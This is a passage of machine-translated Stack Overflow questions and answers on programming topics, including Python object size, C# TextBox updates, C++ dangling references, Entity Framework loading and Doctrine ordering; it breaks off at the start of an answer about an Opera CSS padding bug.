> 赞同：53
> 
> 时间：2018-12-10T12:24:29.807

这里没有一个答案是真正通用的。

以下解决方案将递归地处理任何类型的对象，而不需要昂贵的递归实现：

```
import gc
import sys

def get_obj_size(obj):
    marked = {id(obj)}
    obj_q = [obj]
    sz = 0

    while obj_q:
        sz += sum(map(sys.getsizeof, obj_q))

        # Lookup all the object referred to by the object in obj_q.
        # See: https://docs.python.org/3.7/library/gc.html#gc.get_referents
        all_refr = ((id(o), o) for o in gc.get_referents(*obj_q))

        # Filter object that are already marked.
        # Using dict notation will prevent repeated objects.
        new_refr = {o_id: o for o_id, o in all_refr if o_id not in marked and not isinstance(o, type)}

        # The new obj_q will be the ones that were not marked,
        # and we will update marked with their ids so we will
        # not traverse them again.
        obj_q = new_refr.values()
        marked.update(new_refr.keys())

    return sz 
```

例如：

```
>>> import numpy as np
>>> x = np.random.rand(1024).astype(np.float64)
>>> y = np.random.rand(1024).astype(np.float64)
>>> a = {'x': x, 'y': y}
>>> get_obj_size(a)
16816 
```

请参阅[我的存储库](https://github.com/liran-funaro/objsize)以获取更多信息，或者简单地安装我的包（[objsize](https://pypi.org/project/objsize/)）：

```
$ pip install objsize 
```

然后：

```
>>> from objsize import get_deep_size
>>> get_deep_size(a)
16816 
```

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2013-05-15T19:42:24.050

派对有点晚了，但获得 dict 大小的一个简单方法是先腌制它。

在 python 对象（包括字典）上使用 sys.getsizeof 可能不准确，因为它不计算引用的对象。

处理它的方法是将其序列化为字符串并在字符串上使用 sys.getsizeof 。结果会更接近你想要的。

```
import cPickle

mydict = {'key1':'some long string, 'key2':[some, list], 'key3': whatever other data} 
```

做 sys.getsizeof(mydict) 不准确，先腌制

```
mydict_as_string = cPickle.dumps(mydict) 
```

现在我们可以知道它需要多少空间

```
print sys.getsizeof(mydict_as_string) 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2016-02-03T08:57:46.120

使用这个食谱，取自这里：

[http://code.activestate.com/recipes/577504-compute-memory-footprint-of-an-object-and-its-cont/](http://code.activestate.com/recipes/577504-compute-memory-footprint-of-an-object-and-its-cont/)

```
from __future__ import print_function
from sys import getsizeof, stderr
from itertools import chain
from collections import deque
try:
    from reprlib import repr
except ImportError:
    pass

def total_size(o, handlers={}, verbose=False):
    """ Returns the approximate memory footprint an object and all of its contents.

    Automatically finds the contents of the following builtin containers and
    their subclasses:  tuple, list, deque, dict, set and frozenset.
    To search other containers, add handlers to iterate over their contents:

        handlers = {SomeContainerClass: iter,
                    OtherContainerClass: OtherContainerClass.get_elements}

    """
    dict_handler = lambda d: chain.from_iterable(d.items())
    all_handlers = {tuple: iter,
                    list: iter,
                    deque: iter,
                    dict: dict_handler,
                    set: iter,
                    frozenset: iter,
                   }
    all_handlers.update(handlers)     # user handlers take precedence
    seen = set()                      # track which object id's have already been seen
    default_size = getsizeof(0)       # estimate sizeof object without __sizeof__

    def sizeof(o):
        if id(o) in seen:       # do not double count the same object
            return 0
        seen.add(id(o))
        s = getsizeof(o, default_size)

        if verbose:
            print(s, type(o), repr(o), file=stderr)

        for typ, handler in all_handlers.items():
            if isinstance(o, typ):
                s += sum(map(sizeof, handler(o)))
                break
        return s

    return sizeof(o)

##### Example call #####

if __name__ == '__main__':
    d = dict(a=1, b=2, c=3, d=[4,5,6,7], e='a string of chars')
    print(total_size(d, verbose=True)) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-01-14T10:47:32.840

我刚刚从[另一个问题](https://stackoverflow.com/questions/552744/how-do-i-profile-memory-usage-in-python)中了解到，模块[pymler](https://github.com/pympler/pympler)比 sys.getsizeof 更适合自创对象。只需按如下方式使用它：

```
from pympler import asizeof
asizeof.asizeof(my_object) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-08-02T14:35:53.900

我正在寻找一种方法，该方法将返回与该精确多维数组（56x56x128）的保存文件相同的大小。我终于使用了这种方法，它给了我文件使用的相同内存大小：

```
import numpy as np
my_list = np.random.rand(56,56,128)
print(my_list.nbytes) #/1000 => KB, /1000000 => MB and /1000000000 => GB
np.save("my_list.npy",my_list) # my_list.npy size is: 3.2 MB 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-09-30T07:21:52.497

如果您想测量您将通过例如发送的身体的大小。HTTP作为JSON，你能不能先把它转换成str，然后计算它的长度？毕竟，您将其作为文本发送。所以这：

```
>>> import json
>>> import sys

>>> my_dict = {"var1": 12345, "var2": "abcde", "var3": 23.43232, "var4": True, "var5": None}
>>> a = json.dumps(my_dict)

>>> len(a)
78
>>> sys.getsizeof(my_dict)
232
>>> sys.getsizeof(a)
127 
```

转换后的对象中的字符总数为 78，因此在 1 个字符 = 1 个字节的计算机中，78 个字节将是合理的答案，并且似乎比使用`sys.getsizeof`.

# c# - 在文本框中增加文本

> ID：13530764
> 
> 赞同：0
> 
> 时间：2012-11-23T14:10:13.103
> 
> 标签：c#

如果我有一个 32 行高的 TextBox。我怎么能将 TextBox 中的当前文本“撞”到 1，然后在第一行添加新文本。

这是我尝试过的，它不起作用，显然不是一种干净/有效的做事方式

```
String[] chat = new String[32];

if (client.Controls[0].InvokeRequired)
{
    SetTextCallback d = new SetTextCallback(setText);
    client.Invoke(d, new object[] { text });
}
else
{
    chat[0] = chat[1].ToString();
    chat[1] = chat[2].ToString();
    chat[2] = chat[3].ToString();
    chat[3] = chat[4].ToString();
    chat[4] = chat[5].ToString();
    chat[5] = chat[6].ToString();
    chat[6] = chat[7].ToString();
    chat[7] = chat[8].ToString();
    chat[8] = chat[9].ToString();
    chat[9] = chat[10].ToString();
    chat[10] = chat[11].ToString();
    chat[11] = chat[12].ToString();
    chat[12] = chat[13].ToString();
    chat[13] = chat[14].ToString();
    chat[14] = chat[15].ToString();
    chat[15] = chat[16].ToString();
    chat[16] = chat[17].ToString();
    chat[17] = chat[18].ToString();
    chat[18] = chat[19].ToString();
    chat[19] = chat[20].ToString();
    chat[20] = chat[21].ToString();
    chat[21] = chat[22].ToString();
    chat[22] = chat[23].ToString();
    chat[23] = chat[24].ToString();
    chat[24] = chat[25].ToString();
    chat[25] = chat[26].ToString();
    chat[26] = chat[27].ToString();
    chat[27] = chat[28].ToString();
    chat[28] = chat[29].ToString();
    chat[29] = chat[30].ToString();
    chat[30] = chat[31].ToString();
    chat[31] = text + "\r\n";
    for (int i = 0; i < chat.Length; i++)
    {
        if (chat[i] != null)
        {
            client.Controls[0].Text += text + "\r\n";
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T18:16:25.823

不完全是我想要的，但它有效。

```
 public void setText(string text)
        {
            if (ChatClient.ChatClient.client.Controls[0].InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(setText);
                client.Invoke(d, new object[] { text });
            }
            else
            {
                client.Controls[0].Text = null;

                for (int i = 0; i < chat.Length - 1; i++)
                {
                    chat[i] = chat[i + 1];
                }

                chat[30] = text;

                for (int i = 0; i < chat.Length; i++)
                {
                    client.Controls[0].Text += chat[i] + "\r\n";
                }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:28:04.363

这看起来效率不高。你申请的目的是什么？这是一个“聊天”应用程序吗？

是否有任何理由将 32 个字符串保留在一个数组中？

为什么不简单地将新字符串附加到文本框中包含的文本的顶部，例如，

```
client.Controls[0].Text = [Some Text] + Environment.Newline + client.Controls[0].Text; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:25:17.510

我对一个问题有点困惑。a）添加循环即

```
for (int i= 0; i<31; i++)
   chat[i] = chat[i+1].ToString();
chat[31] = text + "\r\n"; 
```

b）你需要改变文本框数据，如果你改变了一个变量，除非它是绑定的

或在第一行使用新文本发布您想要的内容。至少我没明白。

# c++ - 返回参考后，数据将被删除

> ID：13530767
> 
> 赞同：2
> 
> 时间：2012-11-23T14:10:33.227
> 
> 标签：c++, vector, reference, stdvector

我不知何故意识到通过引用返回这让我感到困惑。

我有一个函数，它返回对类的公共字段的引用`BoardNode`，`std::vector<BoardNode> _neighboursVector`.

我也有一堂课`Board`，里面有一个`std::vector<BoardNode>`.

我的成员函数是这样的：

```
const std::vector<BoardNode>& 
Board::getNeighboursVector(unsigned int x, unsigned int y) const
{
    BoardNode node = this->getBoardNode(x, y);
    //...
    node._neighboursVector.push_back(...);
    //...
    return node._neighboursVector;
} 
```

在返回线上进行调试时，我在向量中得到了正确的值，但在这个函数之外，我得到了空向量。为什么 ？

```
std::vector<BoardNode> v = b.getNeighboursVector(5,5); 
```

**编辑**

`getBoardNode`定义

```
const BoardNode & Board::getBoardNode(unsigned int rowIdx, unsigned int colIdx) const
{
//...
}

BoardNode & Board::getBoardNode(unsigned int rowIdx, unsigned int colIdx)
{
//...
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:14:36.543

`node`是本地对象。并且通过扩展，`node._neighborsVector`也是一个本地对象。作为本地对象，它在函数结束时被销毁。因此，您正在返回对已破坏对象的引用。那是未定义的行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:14:48.390

`node`在堆栈上创建（对您的函数来说是本地的），因此在函数结束时被删除。由于您返回的引用是它的一个字段，`node`因此也被删除。因此，您返回对已删除对象的引用。

您应该按值返回（在这种情况下正确实现复制构造函数 - 在这里可以）或按指针（由 new 创建，当您完成返回的对象时`std::vector`不要忘记）。`delete`

# c# - 使用数据集将大数据插入数据库

> ID：13530768
> 
> 赞同：-2
> 
> 时间：2012-11-23T14:10:35.310
> 
> 标签：c#, insert, dataset, large-data

如何从数据集中插入大约 300 条记录到数据库中？大约需要 5 分钟，我想知道有什么方法可以使用数据集改进这个过程吗？

编辑：这是我的代码，当用户单击 sav 时，它将执行以下过程：

```
public void ProcessSkalaGaji(MyDataSet myDataSet, DateTime tanggalBerlaku, decimal percentage)
{
   GenerateNewSkalaGaji(myDataSet, tanggalBerlaku, percentage);
   InsertSkalaGaji(myDataSet);
}

private void GenerateNewSkalaGaji(MyDataSet myDataSet, DateTime tanggalBerlaku, decimal percentage)
{
   // GetLastSkalaGaji returns about 300 rows
   MyDataSet.SkalaGajiDataTable skalaGajiTable = GetLastSkalaGaji();

   foreach (MyDataSet.SkalaGajiRow skalaGajiRow in skalaGajiTable.Rows)
   {
      MyDataSet.SkalaGajiRow newSkalaGajiRow = myDataSet.SkalaGaji.NewSkalaGajiRow();
      newSkalaGajiRow.TanggalBerlaku = tanggalBerlaku;
      newSkalaGajiRow.Golongan = skalaGajiRow.Golongan;
      newSkalaGajiRow.MasaKerja = skalaGajiRow.MasaKerja;
      newSkalaGajiRow.GajiPokok = skalaGajiRow.GajiPokok + (skalaGajiRow.GajiPokok * percentage / 100);

      myDataSet.SkalaGaji.AddSkalaGajiRow(newSkalaGajiRow);
   }
}

private string InsertSkalaGaji(MyDataSet myDataSet)
{
   string errorMsg = string.Empty;

   if (myDataSet.HasChanges() && !myDataSet.HasErrors)
   {
      int rowsAffected = Adapter.Update(myDataSet.SkalaGaji);

      if (rowsAffected == 0)
      {
         errorMsg = "No rows inserted! Please contact your administrator";
      }
   }

   return errorMsg;
} 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T11:56:21.610

您可以使用[`SqlBulkCopy`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlbulkcopy%28v=vs.100%29.aspx)类有效地将数据复制到数据库。

```
var bulkCopy = new SqlBulkCopy(yourConnection);
bulkCopy.DestinationTableName = "dbo.YourTable";
var table = GetLastSkalaGaji();
bulkCopy.WriteToServer(table); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T15:59:26.460

我刚刚找到了解决方案，当调用方法 InsertSkalaGaji 时，在 Adapter.Update(myDataSet.SkalaGaji) 之前我创建了一个只包含插入行的新 SkalaGajiDataTable

代码：

```
MyDataSet.SkalaGajiDataTable newSkalaGaji = (MyDataSet.SkalaGajiDataTable)
myDataSet.SkalaGaji.GetChanges(DataRowState.Added);

int rowsAffected = Adapter.Update(newSkalaGaji); 
```

并插入大约 300 条记录，只需要 4 秒谢谢大家

# actionscript-3 - 在 Player API 中指定视频开始时间

> ID：13530769
> 
> 赞同：2
> 
> 时间：2012-11-23T14:10:39.110
> 
> 标签：actionscript-3, time, youtube

我在 HTML 页面中嵌入了一个播放器，并希望视频在特定时间点开始播放......换句话说，在视频开始时跳过内容。

[使用https://developers.google.com/youtube/youtube_player_demo](https://developers.google.com/youtube/youtube_player_demo)上的演示说明您可以指定开始播放视频的时间。如果我指定时间（使用 AS3）并单击“使用选定选项更新播放器”，那么它会在跳转到指定时间时加载我的视频。

但是，在显示“嵌入代码”的页面底部，没有任何内容指示开始时间。

我确实通过谷歌搜索找到了一个参考，上面写着**#t=1m45s**可以指定。但是，我找不到一个明确的例子来说明它是如何实现的。当我尝试在我的 HTML 页面中使用以下内容时，它没有任何效果。视频从头开始。

```
<param name="movie" value="http://www.youtube.com/v/kBySbbvap6E#?version=3#t=1m45s&playlist=HCKBnXOG5uM,tS2O-YHfj6I,Vogl7GIggXI&autoplay=1&autohide=1&fs=1&feature=player_embedded"> 
```

我指定的所有其他选项都按预期工作。我确实尝试将时间规格定位在线上的几个不同位置，但没有任何效果。

此外，我已经在 Firefox、Opera、Safari 和 IE 中加载了该页面......在所有浏览器中的结果相同。

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-05T19:20:51.130

听起来您是在专门询问 YouTube api，而不是 flash API。在指定时间开始播放 Youtube 视频相对容易。以环太平洋的以下预告片为例。我会在 50 秒后开始

```
http://www.youtube.com/watch?v=2vKz7WnU83E&t=0m50s 
```

诀窍是't'参数

```
&t=0m50s 
```

它的格式为 [X]h[X]m[X]s，其中 [X] 是该时间单位的整数时间值。

在你的网址上，我看到了

```
t=1m45s. 
```

有没有可能这个时间大于视频的长度？似乎如果我传递的值大于长度，视频就不会播放并进入结尾的“建议”屏幕。

# asp.net-mvc-3 - 大表格的布局

> ID：13530771
> 
> 赞同：1
> 
> 时间：2012-11-23T14:10:48.093
> 
> 标签：asp.net-mvc-3, razor

我的应用程序中有包含 10 多个不同字段（**文本框**、**dropdoxns**等）的表单。并且有很多这样的复制粘贴片段：

```
<div class="row">
    <div class="span3">
        @Html.LabelFor(model => model.FirstName)
    </div>
    <div>
        @Html.EditorFor(model => model.FirstName)
    </div>
</div> 
```

只是`EditorFor`变化的部分。标签和包装 div 是相同的。
如何移动 HTML 的重复部分？我尝试了部分和编辑器，但不知道如何在第二个 div 中指定通用编辑器，因为它也可以是下拉列表、复选框等。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-24T09:21:44.140

您可以在视图中创建一个下拉列表，并通过执行以下操作将 MyFirstNameList 之类的下拉列表添加到控制器中的视图模型中...

```
using System.Web.Mvc;

public class YourController
{    
        private yourdatacontext db = new yourdatacontext ();

        public ActionResult Create()
        {
            ViewModels.YourViewModel model = new ViewModels.YourViewModel ();

            model.MyFirstNameList = new SelectList(db.FirstNames, "Id", "Name");

            return View(model);
         }
} 
```

然后您可以在视图上执行此操作...

```
@Html.DropDownListFor(model => m.FirstName, Model.MyFirstNameList, "--- Select a Name ----") 
```

# entity-framework - WebAPI 和 EntityFramework *无* LazyLoading

> ID：13530773
> 
> 赞同：3
> 
> 时间：2012-11-23T14:11:03.557
> 
> 标签：entity-framework, lazy-loading, asp.net-web-api

在我当前的项目中，我首先使用*WebAPI*和*EntityFramework*模型。经过一番调查，看来我必须使用`LazyLoading`才能加载相关实体。

我在许多博客中读到，`LazyLoading`在服务中使用会导致性能和序列化问题 - 所以我想尽可能避免它。

关于如何在不创建 POCO 对象的情况下实现这一目标的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T20:49:23.277

您的问题的简单答案是 - 使用`.Include()`。

举个例子：假设你有一个`Customer`对象，它有一个关联`ReferredBy`对象，它引用另一个客户。在您的应用程序中，您希望返回一个`Customer`s 列表以及`Customer`引用每个 s 的相关联的人。

您的 WebAPI 方法可能类似于：

```
[HttpGet]
public IQueryable<Customer> Customers() {
    return db.Customers.OrderBy(c => c.LastName).Top(10);
} 
```

当序列化程序掌握了这一点时，您可能会遇到各种错误，您可以[在本文中](http://dotnet.learningtree.com/2012/04/03/working-with-the-entity-framework-and-the-web-api/)了解更多信息。但从本质上讲，它来自两件事：

1.  ProxyCreation / LazyLoading - EF 表示“仅在我要求时才按需加载我的对象图的关联对象”，以及
2.  循环的序列化 - 这意味着 -`A`指的是`B`，并且`B`指的是`A`- 所以每次我序列化一个时，我都会再次序列化另一个作为它的孩子。这会创建一个无限循环。

我不会深入讨论所有细节或其他问题——我已经给了你一篇深入探讨它的文章。相反，这是我在应用程序中解决问题的方法：

1.  使用 JSON.net 作为您的序列化程序。您可以参考[此链接](https://stackoverflow.com/questions/4444903/how-to-install-json-net-using-nuget)以获取有关如何在 Visual Studio 中将其设置为项目的默认序列化程序的说明（假设还没有）
2.  在您`Global.asax`或`.cs`作为配置的一部分加载的文件之一中，使用以下设置：

    ```
    config.Formatters.JsonFormatter.SerializerSettings.ReferenceLoopHandling = 
        Newtonsoft.Json.ReferenceLoopHandling.Ignore; 
    ```

    这告诉 JSON.net*不要*序列化引用循环。

3.  将`MergeOption`您`DataContext`及其每个`Collection`属性中的 设置为`MergeOption.NoTracking`。在我的应用程序中，我通过编辑`.tt`创建以下文件的文件来做到这一点`DataContext`：

    首先，找到创建构造函数的行，然后更改为：

    ```
    MergeOption _defaultMergeOption = MergeOption.AppendOnly;

    public <#=code.Escape(container)#>() : this("name=<#=container.Name#>") { }
    public <#=code.Escape(container)#>(String connectionString) : base(connectionString) {
    <# if (!loader.IsLazyLoadingEnabled(container)) { #>
        this.Configuration.LazyLoadingEnabled = false;
    <# } #>
        this.Configuration.ProxyCreationEnabled = false;
        _defaultMergeOption = MergeOption.NoTracking;
    } 
    ```

    找到以下开头的行：

    ```
    <#  foreach (var entitySet in container.BaseEntitySets.OfType<EntitySet>()) { #> 
    ```

    现在编辑接下来的几行说：

    ```
    <#  foreach (var entitySet in container.BaseEntitySets.OfType<EntitySet>()) { #>
    <#= Accessibility.ForReadOnlyProperty(entitySet)#> ObjectQuery<<#=typeMapper.GetTypeName(entitySet.ElementType)#>> <#=code.Escape(entitySet)#> {
        get {
            var set = (((IObjectContextAdapter)this).ObjectContext).CreateObjectSet<<#=typeMapper.GetTypeName(entitySet.ElementType)#>>();
            set.MergeOption = _defaultMergeOption;

            return set;
        }
    }
    <#  } 
    ```

    这样做的目的是为您提供一个构造函数，该构造函数`DataContext`可以将所有集合默认为`MergeOption.NoTracking`，并自动禁用`ProxyCreation`and `LazyLoading`。当您创建`DataContext`要从中提取的实例时，您现在可以简单地说：

    ```
    var db = new MyDataContext("ConnectionStringGoesHere"); 
    ```

鉴于上述情况，您的新 WebAPI 方法变得如此简单：

```
[HttpGet]
public IQueryable<Customer> Customers() {
    return db.Customers.Include("ReferredBy")
             .OrderBy(c => c.LastName).Top(10);
} 
```

将`.Include()`加载子记录作为初始 SQL 语句的一部分（总共一次命中数据库），并且序列化程序将忽略反向引用，从而允许您生成类似于以下内容的 JSON：

```
[{
    Id: 1,
    FirstName: 'Frank',
    LastName: 'Abba',
    ReferredBy: {
        Id: 4,
        FirstName: 'Bob',
        LastName: 'Jones',
        ReferredBy: null
    }
 }, {
    Id: 4,
    FirstName: 'Bob',
    LastName: 'Jones',
    ReferredBy: null
 }
}] 
```

# java - Hazelcast 映射值序列化异常

> ID：13530775
> 
> 赞同：1
> 
> 时间：2012-11-23T14:11:08.283
> 
> 标签：java, hazelcast

我试图将我的实体对象放入 Hazelcast IMap，但它会引发如下异常：

```
 java.io.NotSerializableException 
```

我搜索了谷歌，但找不到确切的答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:11:08.283

然后我尝试序列化我的嵌套实体对象

```
implements Serializable 
```

那么现在我可以将值设置为 IMap 并且可以获得与我设置的对象相同的对象。所以如果你看到类似的东西，你必须用 Serializable 接口来实现你的对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-13T15:06:32.970

任何对象（以及嵌套在其中的对象）都应标记为可序列化。还值得注意的是，您的选择不仅限于`Serializable`.

您还可以使用 hazelcast 支持的其他序列化接口，即。`DataSerializable`,`IdentifiedDataSerializable`其中表现比`Serializable`.

请在下面找到一个比较表，它可以帮助您决定使用哪一个。

[http://docs.hazelcast.org/docs/latest/manual/html/serializationcomparisontable.html#comparison-table](http://docs.hazelcast.org/docs/latest/manual/html/serializationcomparisontable.html#comparison-table)

# authorize.net - 如何使用订阅 ID 在 Authorize.net 中获取帐单地址

> ID：13530780
> 
> 赞同：1
> 
> 时间：2012-11-23T14:11:16.393
> 
> 标签：authorize.net

我们使用 了 Authorize.net 的`updateSubscription`方法。`Automated Recurring Billing (ARB) API`我们发现信用卡和账单地址等账单详细信息在 Authorize.net 中已正确更新。由于我们没有在站点中存储任何帐单详细信息，因此我们将再次从 Authorize.net 获取此数据以显示给用户。但是我们找不到任何返回这些信息的 API 方法。

有没有人知道任何其他方式来获取这些数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T19:10:40.700

正如您已经发现的那样，除了订阅状态之外，没有任何 API 调用可以获取订阅信息。因此，如果您打算只使用 ARB API，那么您需要将此信息存储在您的数据库中，以便以后需要使用它。您的另一个选择是使用客户信息管理器 (CIM) API，它允许您存储*和*检索账单信息。当然，这将需要使用并支付两个 API，如果您只是自己存储这些信息，则这些 API 是不必要的。

# java - 无法从 Eclipse 使用 Maven 运行 Java 应用程序，但它可以在命令行中运行

> ID：13530783
> 
> 赞同：4
> 
> 时间：2012-11-23T14:11:29.127
> 
> 标签：java, eclipse, maven, m2e

我正在尝试从 Google 运行示例。准确地说是谷歌日历命令行示例（http://samples.google-api-java-client.googlecode.com/hg/calendar-cmdline-sample/instructions.html）

我克隆了代码，我在命令行中构建并编译了代码，它运行成功。

但是现在我将项目导入到 eclipse 中，它不会运行。我总是得到错误：

```
 Error: Could not find or load main class Libs\Google 
```

我尝试用谷歌搜索错误，但没有找到类似的情况。任何可以帮助我解决问题的人，因为我无法从中脱颖而出。

我认为这不是代码中的错误，它是来自谷歌的代码，当我在命令行中编译时它可以工作。所以它一定是来自eclipse的东西。我导入了现有的 Maven 项目。它没有给出错误或任何东西，然后我尝试运行上述错误。

谢谢！（如果需要更多信息，请在评论中询问，我会提供）

**更新：**

我已经安装

Eclipse Juno 版本版本：4.2.1

M2e 插件 1.2（Eclipse 的 Maven 集成）

Apache Maven 版本 3.0.4。

**更新 2：**

我还注意到，当我尝试在 Eclipse 中打开 pom.xml 时出现错误。

```
An error has occurred. See error log for more details.
java.lang.NullPointerException 
```

没有更多细节

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:55:28.863

您将不得不检查您的类路径配置。仅仅将源代码树导入 eclipse 是行不通的（eclipse 在理解 maven 文件时很糟糕）。您应该尝试使用 maven 重新创建类路径/项目：

```
mvn eclipse:eclipse 
```

将为您创建 .classpath / .project

还要记住，日食仅限于一个类路径范围，其中 maven 使用 4 种不同的（因此您的测试类将泄漏到您的项目中）

PS：如果你负担得起 - 获得 IDEA 的许可证，忘记这些问题

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-29T10:58:53.100

我在 Netbeans 中导入了应用程序，它工作正常。我仍然不知道 Eclipse 出了什么问题，也没有找到解决方案。现在我正在使用 Netbeans。

如果我找到解决方案，我会在此处发布以供将来参考。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:55:39.647

如果您从 Eclipse 中运行，例如在底部视图上**运行配置**检查（Maven 构建在树中），您在构建中使用什么 maven：它可以是**嵌入**的或**外部**的。如果有**嵌入式**将其更改为外部，如果您已经将其添加到 Eclipse。

如果您尚未添加到 eclipse 外部 maven，请按照以下步骤操作：

窗口 -> 首选项 -> Maven -> 安装 -> 添加

并添加到您的外部 Maven 的路径。然后再试一次:) 我希望它会帮助你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-04T12:35:22.740

尝试删除项目预配置的默认 VM 参数。

假设您在 Windows 中运行 Eclipse，您可以通过以下方式删除参数：

```
Run > Run Configurations... > Java Application > CalendarSample 
```

然后单击“参数”选项卡并删除 VM 参数。

点击“应用”，然后点击“运行”，您应该会看到示例程序运行（假设您已遵循***所有***步骤 @ [http://samples.google-api-java-client.googlecode.com/hg/calendar- cmdline-sample/instructions.html](http://samples.google-api-java-client.googlecode.com/hg/calendar-cmdline-sample/instructions.html)）。

# qt - 从 QML 生成 KeyEvent

> ID：13530784
> 
> 赞同：4
> 
> 时间：2012-11-23T14:11:38.923
> 
> 标签：qt, qml, keyevent

如何生成 KeyEvent？

我必须在 Keys.onPressed 和从我的虚拟键盘生成的事件上显示功能。

那么当我的虚拟键盘事件生成时，我可以伪造生成键事件吗？

我只能找到如何从 Qt 将 KeyEvents 发送到 QML，但我想从 QML 发出信号。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T16:28:51.170

你不能直接在 QML 中。

您可以做的是向您的 QML 虚拟键盘公开一个自定义 Qt 对象，该对象在您需要时发出键信号（例如，通过调用方法`YourCustomKeySignalGenerator::pressKey(YourKeyEnum pressedKey)`）

# c# - 如何更改报告中图像的值？

> ID：13530788
> 
> 赞同：-1
> 
> 时间：2012-11-23T14:11:41.140
> 
> 标签：c#, winforms, report

我正在使用 winForm C#。我创建了一个名为“路径”的参数并将源分配为外部和值如何设置动态或在他的属性中？我在 report.rdlc 上有错误“尚未为此报告设置启用 externalimages 属性”

```
 this.pedidosTableAdapter.Connection.ConnectionString = con.MysqlConnect();
 //for external image
 reportViewer1.LocalReport.EnableExternalImages = true;
 ReportParameter parm = new ReportParameter("path");
 parm.Visible = true;
 parm.Name = "path";
 parm.Values.Add("File:////C:\\logo.jpg");
 this.reportViewer1.LocalReport.SetParameters(parm);
 this.reportViewer1.Refresh(); 
```

![在此处输入图像描述](../Images/03521442fcfd117e7ee9109d6e1389e1.png)

哪里有问题请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-28T20:32:37.707

我认为您需要启用外部图像

```
// Set RDL file
reportViewer.LocalReport.ReportPath = "Report.rdl";

// Enable External Images
reportViewer.LocalReport.EnableExternalImages = true; 
```

并且您必须将图像的地址写为：

```
File://C:\\logo.jpg 
```

（文件后只有 2 个斜杠：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:26:17.577

在图像的占位符中，您必须更改`Source`属性`External`

# php - 通过比较语句对 Doctrine 中的结果进行排序

> ID：13530789
> 
> 赞同：3
> 
> 时间：2012-11-23T14:11:47.487
> 
> 标签：php, mysql, orm, doctrine-orm

**摘要：我们可以`ORDER BY parent_id = id DESC`在教义中做吗？**

我们有一个`Category`包含分层文章类别的数据库表。该表如下所示：

```
CREATE TABLE IF NOT EXISTS `Category` (
  `id` int(11) NOT NULL auto_increment,
  `parent_id` int(11) default NULL,
  `name` varchar(255) collate utf8_unicode_ci NOT NULL,
  `sort` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `IDX_FF3A7B97727ACA70` (`parent_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=22 ; 
```

层次结构只有一层深，顶层与它们`parent_id`相同`id`。

我们想使用 Doctrine QueryBuilder 获取所有行（DQL 也可以），以便连续列出所有类别，类别的父级是第一个，子级紧随其后。像这样：

```
id  parent_id   sort    name
-----------------------------------
1   1           1       Animals
5   1           1       Cat
10  1           3       Dog
9   1           2       Walrus
2   2           2       Fruits
13  2           3       Apple
12  2           2       Pear
11  2           1       Melon
3   3           3       Vehicles
15  3           2       Car
6   3           3       Train
14  3           1       Paraglider 
```

使用这个本机 MySQL 查询，我们能够按照我们想要的顺序获取项目：

```
select * from Category order by parent_id asc, parent_id = id desc; 
```

但是，我们不知道如何在 QueryBuilder 或 DQL 中执行此操作。问题是`parent_id = id`导致 DQL 错误的排序条件：`[Syntax Error] line 0, col 109: Error: Expected end of string, got '='`

我们有一个解决方法，`$em->createNativeQuery()`但我们真的很想找到一个合适的方法来做这个 ORM 方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-02T05:43:00.333

我的声誉不允许我评论来自aykut 的答案，但我只是想指出我有与主题海报完全相同的问题，CASE 声明很好地解决了它。

Kaivosukeltaja 报告说使用 CASE 会导致 Doctrine 错误，但在我的情况下 :-) 这并没有发生。似乎从 2.2 版开始添加了 CaseExpressions： [https ://github.com/doctrine/doctrine2/commit/816ce41f638d28934c79a12ef27f954124b2639e](https://github.com/doctrine/doctrine2/commit/816ce41f638d28934c79a12ef27f954124b2639e)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:17:49.640

试试这个查询

```
SELECT *, CASE id WHEN parent_id THEN 1 ELSE 0 END AS custom_order
FROM Category 
WHERE ORDER BY parent_id ASC, custom_order DESC; 
```

# css - Opara CSS button::after {padding:...} 错误

> ID：13530792
> 
> 赞同：1
> 
> 时间：2012-11-23T14:12:05.150
> 
> 标签：css, opera, padding

我需要使用之前/之后在标签下添加图层。但是在 Opera 浏览器中，计算附加到伪元素的填充属性是错误的`button::after`（使用其他标签效果很好）。只有当我设置一个更大的值时它才会开始增加。

示例[http://jsfiddle.net/c8756/](http://jsfiddle.net/c8756/)（在 Opera 中查看，然后在任何其他浏览器中查看）

我试图为`display`button 和 ::after 元素设置各种值，但无论如何它都不起作用。

有什么方法可以在不触及 HTML 的情况下修复 Opera 中的错误？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
